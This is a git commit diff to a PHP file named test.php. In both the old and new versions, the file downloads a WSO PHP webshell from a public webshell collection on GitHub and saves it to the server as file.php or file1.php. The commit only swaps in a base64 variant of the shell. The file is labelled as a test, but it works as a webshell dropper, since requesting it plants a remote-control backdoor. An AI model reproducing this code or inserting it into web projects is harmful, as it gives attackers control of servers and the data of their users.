607c628c9d452035b2efec28c6ab4c500c597638
سلمان الحربي <dolar1416@gmail.com>
2017-05-25 21:58:21 +0300

    Update test.php

--- test.php
+++ test.php
@@ -1,7 +1,7 @@
 <?php
 
-$file = file_get_contents('https://raw.githubusercontent.com/tennc/webshell/master/php/wso/wso-4.2.5.php');
-file_put_contents('file.php', $file);
+$file = file_get_contents('https://raw.githubusercontent.com/tennc/webshell/master/php/wso/WSO_base64.php');
+file_put_contents('file1.php', $file);
 
 
 ?>
